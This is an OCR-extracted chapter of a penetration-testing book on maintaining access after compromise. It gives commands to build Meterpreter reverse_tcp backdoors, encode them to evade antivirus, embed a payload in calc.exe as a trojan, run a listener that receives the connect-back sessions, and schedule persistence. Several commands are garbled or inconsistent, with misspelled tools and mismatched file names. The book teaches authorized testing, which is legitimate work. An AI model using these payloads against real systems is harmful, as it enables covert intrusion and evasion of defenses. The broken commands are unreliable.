  md: '# Chapter Seven


    # Maintaining Access


    Maintaining Access is the fourth stage of the penetration testing lifecycle. The
    chapter will take you through actions performed after exploitation to maintain
    access to a compromised target system. Exploiting a computer system or a network
    is amazing, but the goal of an ethical hacker is to figure out a way to maintain
    access to the target system after exploiting it. There are various methods to
    maintain access with an exploited system, they all share a common motive: to reduce
    the time and effort taken to keep attacking the same machine again after it has
    already been compromised in the first attempt. Access to a compromised system
    may be required again after the first attempt if an ethical hacker is working
    with a team, and the other members need to access the target system at some point.


    Maintaining Access can be called a secondary art form for an ethical hacker that
    requires just as much thought as exploitation. In this chapter, we will cover
    the basic concepts that are followed by ethical hackers to maintain access with
    a compromised system and continue an established session with the target system.


    Let us go through the various methods that are used to maintain access and also
    the tools available to an ethical hacker that can be used in these various methods.


    # Backdoors


    A backdoor is a necessary tool, and therefore, an ethical hacker will have to
    generate, upload, and execute backdoors applications on a compromised system.
    As already discussed earlier, backdoors do not necessarily need to be hidden in
    genuine programs as the case of a Trojan horse, but Trojans may contain backdoors.
    We will go through sections that will teach you how to create a backdoor and a
    Trojan as well so that you understand the differences between the two. At this
    point, you can launch a terminal window in your'
  merge: -1
  pgno: 387
- img_proc: true
  md: 'Kali Linux system so that you can follow the steps with us.


    To begin, you need first to create a directory called backdoors. You can use the
    following command.


    ```

    mkdir backdoors

    ```


    # Backdoors using Metasploit


    As we have already learned in the previous chapter, Metasploit is a very powerful
    framework. The Metasploit GUI is very user friendly, but it is even more impressive
    on the command line. The msfpayload command on a Kali Linux terminal will create
    binaries that can be used against Windows systems, Linux systems, and even web
    applications. Moreover, the output of the msfpayload command can be provided as
    input to msfencode tools toat encode these binaries so that they can evade detection
    by virus scanners.


    # Creating an Executable Binary (Unencoded)


    The msfploit command will work with every payload that is available within the
    Metasploit framework. You can use the msfpayload -l command to list down the available
    payload.


    Our example will be using the “windows/meterpreter/reverse_https” payload.


    ```

    msfpayload {payload_name} S

    ```


    This command shows you fields that need to be set when you want to convert the
    payloads into an executable binary. The msfpayload lets you embed the payloads
    into the following formats.


    +   - Perl

    - Ruby

    - C

    - C Sharp

    - Raw'
  merge: -1
  pgno: 388
- img_proc: true
  md: '+   * Executable

    * Javascript

    * Dynamic Link Library

    * War

    * DBA

    * Python


    With all necessary information at hand, an ethical hacker can create an executable
    binary using the following command.


    Note: This is one command and has to go on a single line.


    ```

    msfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} X > /root/backdoors/unencoded-payload.exe

    ```


    # Creating an Executable Binary (Encoded)


    You can pipe the msfpayload command used in the unencoded example to the msffcode
    tool to encode your payload. This can be done through the following command.


    ```

    msfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} R |msffcode
    -e x86/countdown -c 2 -t raw | msffcode x -t exe -e x86/shikata_ga_nai -c 3 -k
    -o /root/backdoors/unencoded-payload.exe

    ```


    The image below shows the output of this command.


    # Encoded Trojan Horse


    We have discussed a few backdoors that can execute without needing any user interaction
    earlier in the book. However, a trojan horse appears to be a genuine program that
    a user may need to use for their daily tasks.


    Our example uses the calc.exe file, which executes the calculator application
    in Windows. Note that we are performing this on Windows XP. We will'
  merge: -1
  pgno: 389
- img_proc: true
  md: 'first copy the calc.exe file from the Windows operating system files to an
    external drive. We are reiterating that we are using the Windows XP binary of
    calc.exe, as not all binaries in the Windows platform are vulnerable to Trojan
    attacks. The same calculator binary from a Windows 7 platform cannot be embedded
    with a Trojan. Therefore, executing this a calc.exe file from Windows 7 will not
    affect a user at. The other parameters that an ethical hacker should consider
    firewalls, detection systems, and the level of encoding. The trial and error approach
    is encouraged, as every Trojan doesn''t need to succeed.


    The command is as follows.


    ```

    msfpayload windows/meterpreter/reverse_tcp {YOUR_IP} {PORT}

    R | msfencode -e x86/countdown -c 2 -t raw | msfencode -x /media/

    {EXTERNAL_USB_DRIVE}/calc.exe -t exe -e x86/shikata_ga_nai -nc 3 -o /root/backdoors/Trojan-calc.exe

    ```


    This command will successfully convert the calc.exe file into a Trojan-smd-payload.exe
    executable. The ethical hacker can now use one of the many methods to upload this
    file to the target''s system, and the Trojan will be executed when the user interacts
    with this file.


    # Setting up a Metasploit Listener


    You can use the following command step by step to set up a Metasploit listener
    via the Kali Linux terminal.


    +   1. Msfconsole

    2. Use exploit/multi/handler'
  merge: -1
  pgno: 390
- img_proc: true
  md: '+   3. Set payload windows/meterpreter/reverse_tcp

    4. Set lhost {your_ip}

    5. Set lport {port}

    6. Run


    When you have set up a Metasploit listener and start receiving calls from the
    backdoor on the target system, it is because the user executed the unencoded-payload.exe.


    # Persistent Backdoors


    You may remember that when you were in college, you would keep going back to your
    parent’s place at regular intervals to collect your clothes or request some financial
    aid. Similarly, a backdoor also keeps for more instructions from the ethical hacker
    at regular intervals. The meterpreter shell has the scheduleme option that can
    be used to achieve this. You can schedule commands to be launched at regular intervals
    using scheduleme. Alternatively, you can schedule commands to be launched based
    on user actions as restarting the system or logging into the system.


    The command is as follows.


    ```

    scheduleme -c {\file/command:\} -i -l

    ```


    For example, you can create a schedule to launch the unencoded-payload.exe file
    when a user restarts the system. The command will be executed only when the user
    restarts the system.


    # Detectability


    If an ethical hacker is already aware of the antivirus system running on the target
    system, they can upload the Trojans or backdoors created by them on the following
    website to see which antivirus software in the world already have signatures to
    detect those Trojans and backdoors.'
  merge: -1
